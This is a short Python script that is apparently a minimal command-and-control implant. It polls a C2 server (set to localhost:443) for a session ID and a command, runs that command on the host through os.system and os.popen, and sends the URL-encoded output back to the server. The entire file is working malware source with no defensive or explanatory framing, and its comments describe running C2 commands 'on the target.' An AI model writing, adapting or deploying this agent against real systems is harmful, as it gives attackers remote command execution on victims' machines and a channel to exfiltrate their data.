import urllib.request
import urllib
import os
import time

#Comms
c2 = 'http://localhost:443'

#initialiazation, this will set establish a Session ID
url = c2 + '/'
sid = urllib.request.urlopen(url).read().decode("utf-8")

# Command execution
time.sleep(2)
url = c2 + '/retrcommand'
response = urllib.request.urlopen(url)
command = response.read().decode("utf-8")
os.system(command) #runs the command from our C2 server on the target
commanddata = os.popen(command)
commanddatatext = urllib.parse.quote_plus(commanddata.read())

#Send command output to C2
urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
